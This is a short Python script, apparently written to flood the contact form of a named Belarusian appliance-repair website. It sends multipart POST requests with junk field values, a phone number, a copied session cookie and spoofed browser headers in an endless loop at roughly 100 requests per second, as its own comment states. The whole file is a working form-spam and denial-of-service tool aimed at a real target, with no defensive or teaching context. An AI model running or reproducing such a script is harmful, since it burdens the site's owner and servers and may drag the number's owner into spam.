import aiohttp
import asyncio
import time

async def send_request(session):
    url = 'https://stiralki24.by/formsend.php'
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryddOQwqlAqvw6NKA4',
        'Cookie': 'beget=begetok; _gcl_au=1.1.936508754.1739128723; _ym_uid=1739128723246036553; _ym_d=1739128723; PHPSESSID=654ig8uvlh9k7cu6ajo964jlpf; _gid=GA1.2.253059374.1744912965; _ym_isad=2; _ym_visorc=w; _gat_UA-227130806-1=1; _ga=GA1.2.1487202651.1739128723; _ga_WKEK423B04=GS1.2.1744912965.2.1.1744914031.3.0.0; _ga_1HWB5C0CWM=GS1.1.1744912965.3.1.1744914031.2.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    }
    data = {
        'marka_form': 'dddddd',
        'text_form1': 'ddddddd',
        'phone_form': '+37525552323',
        'skidka': 'Да',
        'submit': 'Отправить'
    }
    global count
    try:
        async with session.post(url, headers=headers, data=data) as response:
            count += 1
            print(f'Отправка #{count}: {response.status}')
    except Exception as e:
        print(f'Ошибка: {e}')

async def main():
    async with aiohttp.ClientSession() as session:
        while True:
            await send_request(session)
            await asyncio.sleep(0.01)  # 10 мс = ~100 запросов/сек

count = 0
if __name__ == '__main__':
    asyncio.run(main())